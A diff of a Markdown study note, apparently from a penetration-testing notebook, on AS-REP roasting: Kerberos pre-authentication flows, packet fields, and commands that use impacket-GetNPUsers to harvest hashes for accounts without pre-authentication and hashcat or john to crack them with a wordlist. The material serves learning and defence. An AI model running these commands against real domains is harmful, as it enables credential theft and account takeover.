@@ -1,3 +1,5 @@
+# AS-REP Roasting
+
 AS-REP roasting is an attack against Kerberos that allows password hashes to be retrieved for users that do not require Pre-authentication.
 
 - Some accounts may be configured not to require pre-authentication (e.g., service accounts or old accounts). 
@@ -5,9 +7,13 @@ AS-REP roasting is an attack against Kerberos that allows password hashes to be 
 - For these accounts, the KDC will directly respond to an AS-REQ (Authentication Service Request) with an AS-REP message.
 
 
-### Normal Authentication Flow When PreAuth is Enabled For a User
+## Normal Authentication Flow When PreAuth is Enabled For a User
 
-#### AS REQ
+
+- **AS-REQ:** Client sends a timestamp encrytped with user's password hash
+- **AP-REP:** Authentication server verifies user's identity by decrypting the timestamp, if verified it responds with TGT + Session Key encrypted with client's password hash.
+
+### AS REQ
 
 ```
 Kerberos AS-REQ
@@ -30,7 +36,7 @@ Kerberos AS-REQ
 ```
 
 - padata: (Pre Auth Data) Current TImeStamp Encrypted with User's Password hash
-#### AS REP
+### AS REP
 
 ```
 Kerberos AS-REP
@@ -50,8 +56,12 @@ Kerberos AS-REP
 - ticket: TGT, encrypted with KDC's key (krbtgt account hash)
 - enc-part: session key, encrypted with the user’s password hash, (we need this session key when requesting Service Tickets)
 
-### Authentication Flow When PreAuth is Disabled For a User.
-#### AS REQ
+## Authentication Flow When PreAuth is Disabled For a User.
+
+- **AS-REQ:** Client sends a username only.
+- **AP-REP:** Authentication server responds with TGT + Session Key encrypted with client's password hash.
+
+### AS REQ
 
 ```
 Kerberos AS-REQ
@@ -68,7 +78,7 @@ Kerberos AS-REQ
 
 - No padata field: This is the key indicator that pre-authentication is disabled
 - cname: name of the user
-#### AS REP 
+### AS REP 
 
 ```
 Kerberos AS-REP
@@ -98,9 +108,13 @@ $krb5asrep$18$bob@DOMAIN.HTB:a3d1f5...
 impacket-GetNPUsers -dc-ip X.X.X.X doamin.local/ -usersfile users.txt -format john -outputfile hashes
 ```
 
+![image info](../assets/Pasted%20image%2020250721205936.png)
+
 ```
-john -wordlist=/usr/share/wordlists/rockyou.txt hashes
+hashcat asrep.hash /usr/share/wordlists/rockyou.txt -a 0 -m 18200  hashes.txt
 ```
+
+![image info](../assets/Pasted%20image%2020250721210137.png)
 
 ### Mitigation
 
